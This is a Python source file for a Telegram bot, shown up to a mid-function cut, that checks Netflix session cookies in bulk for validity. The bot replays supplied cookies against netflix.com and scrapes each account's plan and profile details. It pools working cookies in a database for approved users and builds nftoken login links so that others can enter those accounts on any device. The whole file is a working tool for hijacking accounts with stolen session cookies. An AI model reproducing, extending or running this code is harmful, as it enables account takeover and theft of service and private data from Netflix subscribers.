#!/usr/bin/env python3
"""
NETFLIX COOKIES CHECKER BOT - ADVANCED EDITION
Telegram bot with premium emoji support, bulk processing, and advanced features.
"""

import os
import sys
import time
import json
import re
import base64
import logging
import asyncio
import aiohttp
import uuid
import tempfile
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Optional, Set, Tuple, Any
from functools import wraps
from urllib.parse import unquote
import random
import string
import hashlib

# Telegram
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, ContextTypes,
    CallbackQueryHandler, MessageHandler, filters,
    ConversationHandler
)

# Database
from pymongo import MongoClient, ASCENDING, DESCENDING
import pymongo

# Load env
from dotenv import load_dotenv
load_dotenv()

# ----------------------------- CONFIG ----------------------------------
BOT_TOKEN = os.getenv("BOT_TOKEN", "YOUR_BOT_TOKEN_HERE")
MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://user:pass@cluster.mongodb.net/")
DATABASE_NAME = os.getenv("DATABASE_NAME", "netflix_bot")
ADMIN_IDS = [int(id.strip()) for id in os.getenv("ADMIN_IDS", "123456789").split(",")]

CHECK_TIMEOUT = int(os.getenv("CHECK_TIMEOUT", "30"))
MAX_BULK_CHECK = int(os.getenv("MAX_BULK_CHECK", "100"))
CONCURRENT_CHECKS = int(os.getenv("CONCURRENT_CHECKS", "5"))
EXPORT_DIR = os.getenv("EXPORT_DIR", "exports")

# ----------------------------- LOGGING ---------------------------------
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.FileHandler("netflix_bot.log"), logging.StreamHandler()]
)
logger = logging.getLogger("netflix_bot")

# ========================== PREMIUM EMOJIS =============================
# Full dictionary with verified emoji IDs (for Telegram premium)
PREMIUM_EMOJIS = {
    "💎": "5427168083074628963",
    "🥇": "5440539497383087970",
    "⌛": "5386367538735104399",
    "⚙️": "5341715473882955310",
    "⚙": "5341715473882955310",
    "⛔️": "5260293700088511294",
    "⛔": "5260293700088511294",
    "▶️": "5264919878082509254",
    "▶": "5264919878082509254",
    "☠️": "5251591568065845575",
    "☠": "5251591568065845575",
    "💀": "5251591568065845575",
    "📌": "6136663351427603393",
    "🤫": "6138532229137049159",
    "🗿": "5208878706717636743",
    "🎁": "6075873960573017149",
    "🍭": "6075445090908644952",
    "😉": "6136237758823273814",
    "🦇": "6138798143447244059",
    "🎵": "6089165857856952184",
    "🌐": "5395558210402807000",
    "⏳": "5316977222467206948",
    "👤": "5987557724886405444",
    "👨": "5350519289256355751",
    "📱": "5357421984600833714",
    "🪪": "5260561650213220533",
    "🔒": "5296369303661067030",
    "📍": "5391032818111363540",
    "🚀": "5866355487255039002",
    "✉️": "4929214028657460019",
    "✉": "4929214028657460019",
    "🌟": "5330519486279740988",
    "🔗": "5271604874419647061",
    "⚡": "5875091588174059190",
    "✅": "6107134841382246388",
    "🔴": "6104873438021686768",
    "👥": "5987557724886405444",
    "📊": "5316977222467206948",
    "📁": "5427168083074628963",
    "🔄": "5386367538735104399",
    "💻": "5427168083074628963",
    "📺": "5386367538735104399",
    "🍏": "5357421984600833714",
    "📤": "5427168083074628963",
    "📥": "5427168083074628963",
    "📈": "5316977222467206948",
    "📅": "5386367538735104399",
    "🕒": "5386367538735104399",
    "⚠️": "5260293700088511294",
    "❌": "5260293700088511294",
    "📭": "5427168083074628963",
    "🔑": "5296369303661067030",
    "🆔": "5260561650213220533",
    "🍪": "6075445090908644952",
    "⭐": "5330519486279740988",
    "👑": "5440539497383087970",
}

def get_emoji(emo: str) -> str:
    """Return Telegram custom emoji HTML tag if available, else plain emoji."""
    emoji_id = PREMIUM_EMOJIS.get(emo)
    if emoji_id:
        return f'<tg-emoji emoji-id="{emoji_id}">{emo}</tg-emoji>'
    return emo

# ========================== UTILITIES ==================================
def make_aware(dt):
    if dt is None:
        return None
    if hasattr(dt, 'tzinfo') and dt.tzinfo is None:
        return dt.replace(tzinfo=timezone.utc)
    return dt

def get_current_time():
    return datetime.now(timezone.utc)

def parse_netscape_cookie(cookie_text: str) -> Dict[str, str]:
    cookie_dict = {}
    lines = cookie_text.strip().split('\n')
    for line in lines:
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split()
        if len(parts) >= 7:
            name = parts[5]
            value = parts[6]
            cookie_dict[name] = value
    return cookie_dict

def is_netscape_format(cookie: str) -> bool:
    """Check if cookie is in Netscape format."""
    return '.netflix.com' in cookie and 'TRUE' in cookie

def validate_cookie(cookie: str) -> bool:
    if not cookie:
        return False
    cookie = cookie.strip()
    # For bulk we will require Netscape
    if is_netscape_format(cookie):
        return True
    # Other formats accepted for single check
    if '=' in cookie and ';' in cookie:
        netflix_patterns = ['NetflixId', 'nfvdid', 'SecureNetflixId']
        cookie_lower = cookie.lower()
        for pattern in netflix_patterns:
            if pattern.lower() in cookie_lower:
                return True
    try:
        decoded = base64.b64decode(cookie, validate=True)
        if decoded:
            try:
                decoded_str = decoded.decode('utf-8')
                if '=' in decoded_str and ('NetflixId' in decoded_str or 'netflix' in decoded_str.lower()):
                    return True
            except:
                pass
    except:
        pass
    return False

def parse_cookie(cookie: str) -> Dict[str, str]:
    cookie = cookie.strip()
    cookie_dict = {}
    if is_netscape_format(cookie):
        try:
            cookie_dict = parse_netscape_cookie(cookie)
            if cookie_dict:
                return cookie_dict
        except:
            pass
    try:
        decoded = base64.b64decode(cookie, validate=True)
        try:
            cookie = decoded.decode('utf-8')
        except:
            pass
    except:
        pass
    if ';' in cookie:
        parts = cookie.split(';')
    else:
        parts = cookie.split()
    for part in parts:
        part = part.strip()
        if '=' in part:
            key, value = part.split('=', 1)
            cookie_dict[key.strip()] = value.strip()
    return cookie_dict

def extract_nftoken(cookie_str: str) -> Optional[str]:
    cookie_dict = parse_cookie(cookie_str)
    netflix_id = cookie_dict.get('NetflixId')
    if not netflix_id:
        match = re.search(r'NetflixId=([^;]+)', cookie_str)
        if match:
            netflix_id = match.group(1)
    if not netflix_id:
        return None
    netflix_id = unquote(netflix_id)
    for part in netflix_id.split('&'):
        if part.startswith('ct='):
            return part[3:]
    return None

def normalize_cookie(cookie: str) -> str:
    cookie = cookie.replace('\r', '')
    cookie = cookie.replace('\n', '\\n')
    return cookie

def denormalize_cookie(cookie: str) -> str:
    return cookie.replace('\\n', '\n')

# ========================== DATABASE ==================================
class Database:
    def __init__(self, uri=MONGODB_URI, db_name=DATABASE_NAME):
        if not uri:
            logger.error("MONGODB_URI not set!")
            self.client = None
            self.db = None
            return
        self.client = MongoClient(uri, serverSelectionTimeoutMS=5000)
        self.db = self.client[db_name]
        self.users = self.db.users
        self.cookies = self.db.cookies
        self.checks = self.db.checks
        self.settings = self.db.settings
        self._init_indexes()
        self._init_defaults()

    def _init_indexes(self):
        try:
            self.users.create_index([("user_id", ASCENDING)], unique=True)
            self.users.create_index([("approved", ASCENDING)])
            self.cookies.create_index([("cookie_hash", ASCENDING)], unique=True)
            self.cookies.create_index([("status", ASCENDING)])
            self.cookies.create_index([("account_tier", ASCENDING)])
            self.cookies.create_index([("user_id", ASCENDING)])
            self.checks.create_index([("timestamp", DESCENDING)])
        except Exception as e:
            logger.error(f"Index error: {e}")

    def _init_defaults(self):
        for admin_id in ADMIN_IDS:
            self.users.update_one(
                {"user_id": admin_id},
                {"$set": {"username": "admin", "approved": True, "is_admin": True, "created_at": get_current_time()}},
                upsert=True
            )

    def get_user(self, user_id: int) -> Optional[Dict]:
        return self.users.find_one({"user_id": user_id})

    def create_user(self, user_id: int, username: str = None) -> Dict:
        existing = self.get_user(user_id)
        if existing:
            return existing
        user_data = {
            "user_id": user_id,
            "username": username,
            "approved": False,
            "is_admin": user_id in ADMIN_IDS,
            "total_checks": 0,
            "valid_cookies": 0,
            "created_at": get_current_time(),
            "last_active": get_current_time()
        }
        try:
            self.users.insert_one(user_data)
        except pymongo.errors.DuplicateKeyError:
            return self.get_user(user_id)
        return user_data

    def approve_user(self, user_id: int) -> bool:
        result = self.users.update_one({"user_id": user_id}, {"$set": {"approved": True}})
        return result.modified_count > 0

    def disapprove_user(self, user_id: int) -> bool:
        result = self.users.update_one({"user_id": user_id}, {"$set": {"approved": False}})
        return result.modified_count > 0

    def is_user_approved(self, user_id: int) -> bool:
        user = self.get_user(user_id)
        return user.get("approved", False) if user else False

    def update_user_activity(self, user_id: int):
        self.users.update_one({"user_id": user_id}, {"$set": {"last_active": get_current_time()}})

    def increment_user_stats(self, user_id: int, check_count: int = 1, valid_count: int = 0):
        self.users.update_one({"user_id": user_id}, {"$inc": {"total_checks": check_count, "valid_cookies": valid_count}})

    def add_cookie(self, cookie: str, user_id: int = None) -> str:
        cookie = normalize_cookie(cookie.strip())
        cookie_hash = hashlib.sha256(cookie.encode()).hexdigest()
        existing = self.cookies.find_one({"cookie_hash": cookie_hash})
        if existing:
            return existing["_id"]
        cookie_id = str(uuid.uuid4())
        cookie_data = {
            "_id": cookie_id,
            "cookie": cookie,
            "cookie_hash": cookie_hash,
            "user_id": user_id,
            "status": "pending",
            "account_tier": None,
            "profile_name": None,
            "profile_language": None,
            "maturity_level": None,
            "expires_at": None,
            "checked_at": None,
            "created_at": get_current_time()
        }
        try:
            self.cookies.insert_one(cookie_data)
            return cookie_id
        except pymongo.errors.DuplicateKeyError:
            return self.cookies.find_one({"cookie_hash": cookie_hash})["_id"]

    def add_cookies_bulk(self, cookies: List[str], user_id: int = None) -> List[Dict]:
        results = []
        for cookie in cookies:
            cookie = cookie.strip()
            if cookie and is_netscape_format(cookie):  # Only Netscape for bulk
                try:
                    cookie_id = self.add_cookie(cookie, user_id)
                    results.append({"cookie": cookie, "id": cookie_id, "status": "added"})
                except Exception as e:
                    results.append({"cookie": cookie, "status": "error", "error": str(e)})
            else:
                results.append({"cookie": cookie, "status": "skipped_netscape_required"})
        return results

    def get_cookie(self, cookie_id: str) -> Optional[Dict]:
        return self.cookies.find_one({"_id": cookie_id})

    def find_cookie_by_prefix(self, prefix: str) -> Optional[Dict]:
        docs = list(self.cookies.find({"_id": {"$regex": f"^{prefix}"}}).limit(2))
        if len(docs) == 1:
            return docs[0]
        return None

    def get_cookie_by_hash(self, cookie_hash: str) -> Optional[Dict]:
        return self.cookies.find_one({"cookie_hash": cookie_hash})

    def update_cookie_status(self, cookie_id: str, status: str, details: Dict = None):
        updates = {"status": status, "checked_at": get_current_time()}
        if details:
            updates.update(details)
        self.cookies.update_one({"_id": cookie_id}, {"$set": updates})

    def get_valid_cookies(self, limit: int = 100) -> List[Dict]:
        return list(self.cookies.find({"status": "valid"}).sort("checked_at", -1).limit(limit))

    def get_cookie_stats(self) -> Dict:
        total = self.cookies.count_documents({})
        valid = self.cookies.count_documents({"status": "valid"})
        invalid = self.cookies.count_documents({"status": "invalid"})
        expired = self.cookies.count_documents({"status": "expired"})
        pending = self.cookies.count_documents({"status": "pending"})
        tiers = {}
        for tier in ["Basic", "Standard", "Premium"]:
            tiers[tier] = self.cookies.count_documents({"status": "valid", "account_tier": tier})
        return {"total": total, "valid": valid, "invalid": invalid, "expired": expired, "pending": pending, "tiers": tiers}

    def delete_invalid_cookies(self) -> int:
        result = self.cookies.delete_many({"status": {"$in": ["invalid", "expired"]}})
        return result.deleted_count

    def clear_all_cookies(self) -> int:
        count = self.cookies.count_documents({})
        self.cookies.delete_many({})
        return count

    def log_check(self, user_id: int, cookie_id: str, status: str, details: Dict = None):
        self.checks.insert_one({
            "user_id": user_id,
            "cookie_id": cookie_id,
            "status": status,
            "details": details,
            "timestamp": get_current_time()
        })

    def get_user_checks(self, user_id: int, limit: int = 5) -> List[Dict]:
        return list(self.checks.find({"user_id": user_id}).sort("timestamp", -1).limit(limit))

db = Database()

# ========================== CHECKER ENGINE =============================
class NetflixChecker:
    @staticmethod
    async def check_single_cookie(cookie: str) -> Dict:
        result = {"valid": False, "account_tier": None, "profile_name": None,
                  "profile_language": None, "maturity_level": None, "expires_at": None, "error": None}

        cookie_raw = denormalize_cookie(cookie)
        cookie_dict = parse_cookie(cookie_raw)
        if not cookie_dict:
            result["error"] = "Invalid cookie format"
            return result

        cookie_str = "; ".join([f"{k}={v}" for k, v in cookie_dict.items()])
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Cookie": cookie_str,
            "Connection": "keep-alive",
        }

        try:
            async with aiohttp.ClientSession() as session:
                timeout = aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=15)
                url = "https://www.netflix.com/in/"
                async with session.get(url, headers=headers, timeout=timeout, ssl=False, allow_redirects=True) as resp:
                    final_url = str(resp.url)
                    html = await resp.text(errors='ignore')
                    final_lower = final_url.lower()
                    html_lower = html.lower()

                    if "login" in final_lower or "signin" in final_lower:
                        result["error"] = "Redirected to login page"
                        return result

                    logged_in = False
                    if any(x in final_lower for x in ["browse", "profiles", "watch", "title"]):
                        logged_in = True
                    elif "logout" in html_lower:
                        logged_in = True
                    elif "profile" in html_lower and "sign out" in html_lower:
                        logged_in = True
                    elif 'netflix' in html_lower and 'sign in' not in html_lower:
                        logged_in = "profile" in html_lower or "avatar" in html_lower

                    if not logged_in:
                        result["error"] = "Cookie invalid or expired"
                        return result

                    result["valid"] = True
                    result["account_tier"] = NetflixChecker._extract_tier(html)
                    result["profile_name"] = NetflixChecker._extract_profile_name(html)
                    result["profile_language"] = NetflixChecker._extract_language(html)
                    result["maturity_level"] = NetflixChecker._extract_maturity(html)
                    expire_match = re.search(r'"expires"\s*:\s*"([^"]+)"', html, re.IGNORECASE)
                    if expire_match:
                        result["expires_at"] = expire_match.group(1)
                    else:
                        result["expires_at"] = (get_current_time() + timedelta(days=30)).strftime("%Y-%m-%d")
                    return result
        except asyncio.TimeoutError:
            result["error"] = "Timeout"
        except Exception as e:
            result["error"] = str(e)
        return result

    @staticmethod
    def _extract_tier(html: str) -> str:
        patterns = [r'"accountTier"\s*:\s*"([^"]+)"', r'"planName"\s*:\s*"([^"]+)"', r'planName["\']?\s*[:=]\s*["\']([^"\']+)']
        for pat in patterns:
            match = re.search(pat, html, re.IGNORECASE)
            if match:
                plan = match.group(1).lower()
                if "premium" in plan: return "Premium"
                if "standard" in plan: return "Standard"
                if "basic" in plan: return "Basic"
                return plan.title()
        levels = re.findall(r'maturityLevel["\']?\s*[:=]\s*["\']([^"\']+)', html, re.IGNORECASE)
        if len(levels) >= 4: return "Premium"
        if len(levels) >= 3: return "Standard"
        if len(levels) >= 2: return "Basic"
        return "Unknown"

    @staticmethod
    def _extract_profile_name(html: str) -> str:
        patterns = [r'"profileName"\s*:\s*"([^"]+)"', r'"profile_name"\s*:\s*"([^"]+)"', r'profileName["\']?\s*[:=]\s*["\']([^"\']+)']
        for pat in patterns:
            match = re.search(pat, html, re.IGNORECASE)
            if match:
                return match.group(1).strip()
        return "Unknown"

    @staticmethod
    def _extract_language(html: str) -> str:
        match = re.search(r'"language"\s*:\s*"([^"]+)"', html, re.IGNORECASE)
        return match.group(1) if match else "en-US"

    @staticmethod
    def _extract_maturity(html: str) -> str:
        match = re.search(r'"maturityLevel"\s*:\s*"([^"]+)"', html, re.IGNORECASE)
        return match.group(1) if match else "Unknown"

    @staticmethod
    async def check_bulk_cookies(cookies: List[str], progress_callback=None) -> List[Dict]:
        semaphore = asyncio.Semaphore(CONCURRENT_CHECKS)
        async def check_one(cookie, idx):
            async with semaphore:
                result = await NetflixChecker.check_single_cookie(cookie)
                result["cookie"] = cookie
                result["index"] = idx
                if progress_callback:
                    await progress_callback(idx, len(cookies))
                return result
        tasks = [check_one(c, i) for i, c in enumerate(cookies)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        processed = []
        for res in results:
            if isinstance(res, Exception):
                processed.append({"cookie": "", "valid": False, "error": str(res)})
            else:
                processed.append(res)
        return processed

# ========================== KEYBOARDS & HELPERS =========================
SEP = "━━━━━━━━━━━━━━━━━━━━"

def format_header(title: str, emoji: str = "🎬") -> str:
    return f"{get_emoji(emoji)} <b>{title}</b> {get_emoji('🌟')}"

def build_login_keyboard(cookie_id: str, nftoken: str) -> InlineKeyboardMarkup:
    keyboard = [
        [InlineKeyboardButton("💻 PC / Web", url=f"https://www.netflix.com/login?nftoken={nftoken}"),
         InlineKeyboardButton("📺 TV", url=f"https://www.netflix.com/tv8?nftoken={nftoken}")],
        [InlineKeyboardButton("📱 Android", url=f"https://www.netflix.com/login?nftoken={nftoken}"),
         InlineKeyboardButton("🍏 iPhone", url=f"https://www.netflix.com/login?nftoken={nftoken}")],
        [InlineKeyboardButton("📤 Upload File", callback_data=f"upload_{cookie_id}"),
         InlineKeyboardButton("🔄 Restart", callback_data="restart")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ========================== HANDLERS ===================================
def admin_required(func):
    @wraps(func)
    async def wrapper(update, context, *args, **kwargs):
        user_id = update.effective_user.id
        if user_id not in ADMIN_IDS:
            await update.message.reply_text(f"{get_emoji('⛔️')} <b>Unauthorized</b>", parse_mode="HTML")
            return
        return await func(update, context, *args, **kwargs)
    return wrapper

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    username = update.effective_user.username
    db.create_user(user_id, username)
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(
            f"{get_emoji('⛔️')} <b>Access Denied</b>\nContact admin for approval.",
            parse_mode="HTML"
        )
        return
    text = (
        f"{format_header('Netflix Cookie Checker', '🎬')}\n"
        f"{SEP}\n"
        f"{get_emoji('⚡')} <b>Advanced Cookie Validator</b>\n"
        f"Check, validate, and generate login links.\n\n"
        f"{get_emoji('📌')} <b>Commands</b>\n"
        f"  /check <code>&lt;cookie&gt;</code> – single check\n"
        f"  /bulk – bulk upload (Netscape only)\n"
        f"  /login <code>&lt;id&gt;</code> – device login\n"
        f"  /stats – your statistics\n"
        f"  /valid – list valid cookies\n"
        f"  /status – bot system status\n"
        f"  /help – this message\n\n"
        f"{get_emoji('📦')} <b>Formats</b>\n"
        f"• Standard: <code>name=value; ...</code>\n"
        f"• Netscape: <code>.netflix.com TRUE / ...</code>\n"
        f"• Base64 encoded\n\n"
        f"{get_emoji('👑')} <b>Admin</b>\n"
        f"  /approve <code>&lt;id&gt;</code>\n"
        f"  /disapprove <code>&lt;id&gt;</code>\n"
        f"  /users – list users\n"
        f"  /export – export valid cookies\n"
        f"  /cleanup – delete invalid/expired\n"
        f"  /clear – clear ALL cookies (danger)\n\n"
        f"{get_emoji('🦇')} <b>Developer:</b> @OfficialAnnebella"
    )
    await update.message.reply_text(text, parse_mode="HTML", disable_web_page_preview=True)

async def help_command(update, context):
    await start(update, context)

async def check_single(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(f"{get_emoji('⛔️')} <b>Access Denied</b>", parse_mode="HTML")
        return
    args = context.args
    if not args:
        await update.message.reply_text(
            f"{get_emoji('❌')} Usage: <code>/check &lt;cookie&gt;</code>", parse_mode="HTML"
        )
        return
    cookie = " ".join(args)
    if not validate_cookie(cookie):
        await update.message.reply_text(
            f"{get_emoji('❌')} <b>Invalid cookie format</b>", parse_mode="HTML"
        )
        return
    cookie_id = db.add_cookie(cookie, user_id)
    msg = await update.message.reply_text(
        f"{get_emoji('⏳')} Checking...\nID: <code>{cookie_id}</code>", parse_mode="HTML"
    )
    result = await NetflixChecker.check_single_cookie(cookie)
    if result.get("valid"):
        db.update_cookie_status(cookie_id, "valid", {
            "account_tier": result.get("account_tier"),
            "profile_name": result.get("profile_name"),
            "profile_language": result.get("profile_language"),
            "maturity_level": result.get("maturity_level"),
            "expires_at": result.get("expires_at")
        })
        db.increment_user_stats(user_id, 1, 1)
        db.log_check(user_id, cookie_id, "valid", result)
        response = (
            f"{format_header('Valid Cookie', '✅')}\n{SEP}\n"
            f"{get_emoji('📊')} Plan: <code>{result.get('account_tier', 'Unknown')}</code>\n"
            f"{get_emoji('👤')} Profile: <code>{result.get('profile_name', 'Unknown')}</code>\n"
            f"{get_emoji('📅')} Expires: <code>{result.get('expires_at', 'Unknown')}</code>\n"
            f"{get_emoji('🆔')} ID: <code>{cookie_id}</code>"
        )
        cookie_doc = db.get_cookie(cookie_id)
        if cookie_doc:
            raw = denormalize_cookie(cookie_doc.get("cookie", ""))
            nftoken = extract_nftoken(raw)
            if nftoken:
                keyboard = build_login_keyboard(cookie_id, nftoken)
                await msg.edit_text(response, parse_mode="HTML", reply_markup=keyboard)
                return
        await msg.edit_text(response, parse_mode="HTML")
    else:
        status = "expired" if "expired" in str(result.get("error", "")).lower() else "invalid"
        db.update_cookie_status(cookie_id, status, {"error": result.get("error")})
        db.increment_user_stats(user_id, 1, 0)
        db.log_check(user_id, cookie_id, status, result)
        response = (
            f"{format_header('Invalid', '❌')}\n{SEP}\n"
            f"{get_emoji('⚠️')} Error: <code>{result.get('error', 'Unknown')}</code>\n"
            f"{get_emoji('🆔')} ID: <code>{cookie_id}</code>"
        )
        await msg.edit_text(response, parse_mode="HTML")

async def handle_cookie_message(update, context):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(f"{get_emoji('⛔️')} Access Denied", parse_mode="HTML")
        return
    cookie = update.message.text.strip()
    if validate_cookie(cookie):
        context.args = [cookie]
        await check_single(update, context)
    else:
        await update.message.reply_text(
            f"{get_emoji('❌')} Invalid cookie. Use /check", parse_mode="HTML"
        )

async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(f"{get_emoji('⛔️')} Access Denied", parse_mode="HTML")
        return
    if not context.args:
        await update.message.reply_text(f"{get_emoji('❌')} Usage: /login <cookie_id>", parse_mode="HTML")
        return
    user_input = context.args[0].strip()
    cookie_doc = db.get_cookie(user_input)
    if not cookie_doc:
        cookie_doc = db.find_cookie_by_prefix(user_input)
    if not cookie_doc:
        await update.message.reply_text(
            f"{get_emoji('❌')} Cookie not found: <code>{user_input}</code>", parse_mode="HTML"
        )
        return
    if cookie_doc.get("status") != "valid":
        await update.message.reply_text(
            f"{get_emoji('⛔️')} Cookie not valid (status: {cookie_doc.get('status')})", parse_mode="HTML"
        )
        return
    cookie_id = cookie_doc["_id"]
    raw = denormalize_cookie(cookie_doc.get("cookie", ""))
    nftoken = extract_nftoken(raw)
    if not nftoken:
        await update.message.reply_text(
            f"{get_emoji('⚠️')} No nftoken found in this cookie.", parse_mode="HTML"
        )
        return
    keyboard = build_login_keyboard(cookie_id, nftoken)
    response = (
        f"{format_header('Device Login', '🔑')}\n{SEP}\n"
        f"{get_emoji('🆔')} ID: <code>{cookie_id}</code>\n"
        f"{get_emoji('👤')} Profile: <code>{cookie_doc.get('profile_name', 'Unknown')}</code>\n"
        f"{get_emoji('📊')} Plan: <code>{cookie_doc.get('account_tier', 'Unknown')}</code>\n\n"
        f"Choose device:"
    )
    await update.message.reply_text(response, parse_mode="HTML", reply_markup=keyboard)

async def stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user = db.get_user(user_id)
    if not user:
        await update.message.reply_text("User not found.")
        return
    stats_data = db.get_cookie_stats()
    checks = db.get_user_checks(user_id, 5)
    response = (
        f"{format_header('Your Stats', '📊')}\n{SEP}\n"
        f"{get_emoji('📈')} Total checks: <code>{user.get('total_checks', 0)}</code>\n"
        f"{get_emoji('✅')} Valid: <code>{user.get('valid_cookies', 0)}</code>\n"
        f"{get_emoji('📅')} Since: <code>{user.get('created_at', get_current_time()).strftime('%Y-%m-%d')}</code>\n\n"
        f"{format_header('Global Stats', '🌐')}\n{SEP}\n"
        f"{get_emoji('🍪')} Total: <code>{stats_data['total']}</code>\n"
        f"{get_emoji('✅')} Valid: <code>{stats_data['valid']}</code>\n"
        f"{get_emoji('❌')} Invalid: <code>{stats_data['invalid']}</code>\n"
        f"{get_emoji('⏳')} Pending: <code>{stats_data['pending']}</code>\n\n"
        f"{format_header('Tiers', '⭐')}\n"
        f"  Premium: <code>{stats_data['tiers']['Premium']}</code>\n"
        f"  Standard: <code>{stats_data['tiers']['Standard']}</code>\n"
        f"  Basic: <code>{stats_data['tiers']['Basic']}</code>\n"
    )
    if checks:
        response += f"\n{get_emoji('🕒')} Recent checks:\n"
        for c in checks:
            em = get_emoji('✅') if c.get('status') == 'valid' else get_emoji('❌')
            ts = c.get('timestamp', get_current_time()).strftime("%H:%M")
            response += f"{em} {ts} – <code>{c.get('status')}</code>\n"
    await update.message.reply_text(response, parse_mode="HTML")

async def valid_cookies(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(f"{get_emoji('⛔️')} Access Denied", parse_mode="HTML")
        return
    cookies = db.get_valid_cookies(limit=20)
    if not cookies:
        await update.message.reply_text(f"{get_emoji('📭')} No valid cookies.", parse_mode="HTML")
        return
    response = f"{format_header('Valid Cookies', '✅')}\n{SEP}\n"
    for i, c in enumerate(cookies[:10], 1):
        tier = c.get('account_tier', 'Unknown')
        profile = c.get('profile_name', 'Unknown')
        cid = c['_id']
        response += (
            f"{i}. {get_emoji('⭐')} Tier: <code>{tier}</code>\n"
            f"   Profile: <code>{profile}</code>\n"
            f"   ID: <code>{cid}</code>\n"
            f"   (short: <code>{cid[:8]}</code>)\n\n"
        )
    if len(cookies) > 10:
        response += f"\n{get_emoji('...')} and {len(cookies)-10} more."
    await update.message.reply_text(response, parse_mode="HTML")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show bot system status."""
    user_id = update.effective_user.id
    # Anyone can see basic status, but full for admin
    is_admin = user_id in ADMIN_IDS
    try:
        db.client.admin.command('ping')
        db_status = f"{get_emoji('✅')} Connected"
    except:
        db_status = f"{get_emoji('❌')} Disconnected"
    stats = db.get_cookie_stats()
    total_users = db.users.count_documents({})
    uptime = time.time() - start_time
    hours, rem = divmod(uptime, 3600)
    minutes, seconds = divmod(rem, 60)
    uptime_str = f"{int(hours)}h {int(minutes)}m {int(seconds)}s"
    response = (
        f"{format_header('System Status', '⚙️')}\n{SEP}\n"
        f"{get_emoji('💾')} Database: {db_status}\n"
        f"{get_emoji('👤')} Users: <code>{total_users}</code>\n"
        f"{get_emoji('🍪')} Cookies: <code>{stats['total']}</code>\n"
        f"{get_emoji('⏳')} Uptime: <code>{uptime_str}</code>\n"
    )
    if is_admin:
        response += (
            f"\n{get_emoji('📊')} Valid: {stats['valid']} | Invalid: {stats['invalid']} | Expired: {stats['expired']}\n"
            f"Pending: {stats['pending']}\n"
            f"Tiers: Premium {stats['tiers']['Premium']}, Standard {stats['tiers']['Standard']}, Basic {stats['tiers']['Basic']}"
        )
    await update.message.reply_text(response, parse_mode="HTML")

# ----------------------------- BULK (ADVANCED) -------------------------
BULK_FILES_STATE = 1

async def bulk_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not db.is_user_approved(user_id) and user_id not in ADMIN_IDS:
        await update.message.reply_text(f"{get_emoji('⛔️')} Access Denied", parse_mode="HTML")
        return ConversationHandler.END
    context.user_data['bulk_files'] = []
    context.user_data['bulk_total'] = 0
    context.user_data['bulk_valid'] = 0
    await update.message.reply_text(
        f"{format_header('Bulk Upload', '📁')}\n{SEP}\n"
        f"{get_emoji('📤')} Send <b>.txt</b> files (one after another).\n"
        f"{get_emoji('⚠️')} <b>Only Netscape format accepted</b>.\n"
        f"After all files, send <code>/done</code> to start processing.\n"
        f"Send <code>/cancel</code> to abort.",
        parse_mode="HTML"
    )
    return BULK_FILES_STATE

async def handle_bulk_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not update.message.document:
        await update.message.reply_text(f"{get_emoji('❌')} Please send a file.", parse_mode="HTML")
        return BULK_FILES_STATE
    doc = update.message.document
    if not doc.file_name.endswith('.txt'):
        await update.message.reply_text(f"{get_emoji('❌')} Only .txt files.", parse_mode="HTML")
        return BULK_FILES_STATE
    # Download and parse
    try:
        file = await context.bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        text = content.decode('utf-8', errors='ignore')
        lines = [l.strip() for l in text.splitlines() if l.strip()]
        if not lines:
            await update.message.reply_text(f"{get_emoji('❌')} File is empty.", parse_mode="HTML")
            return BULK_FILES_STATE
        # Filter to Netscape only
        netscape_lines = [l for l in lines if is_netscape_format(l)]
        skipped = len(lines) - len(netscape_lines)
        if not netscape_lines:
            await update.message.reply_text(
                f"{get_emoji('❌')} No Netscape cookies found in file. All skipped.", parse_mode="HTML"
            )
            return BULK_FILES_STATE
        context.user_data['bulk_files'].append(netscape_lines)
        context.user_data['bulk_total'] += len(netscape_lines)
        await update.message.reply_text(
            f"{get_emoji('✅')} Added {len(netscape_lines)} cookies from file. Skipped {skipped} non-Netscape.\n"
            f"Total so far: {context.user_data['bulk_total']} cookies.\n"
            f"Send next file or <code>/done</code> to start checking.",
            parse_mode="HTML"
        )
    except Exception as e:
        await update.message.reply_text(f"{get_emoji('⚠️')} Error reading file: {str(e)}", parse_mode="HTML")
    return BULK_FILES_STATE

async def bulk_done(update: Update, context: ContextTypes.DEFAULT_TYPE):
    files = context.user_data.get('bulk_files', [])
    if not files:
        await update.message.reply_text(f"{get_emoji('❌')} No files uploaded yet.", parse_mode="HTML")
        return ConversationHandler.END
    all_cookies = []
    for f in files:
        all_cookies.extend(f)
    total = len(all_cookies)
    if total > MAX_BULK_CHECK:
        await update.message.reply_text(
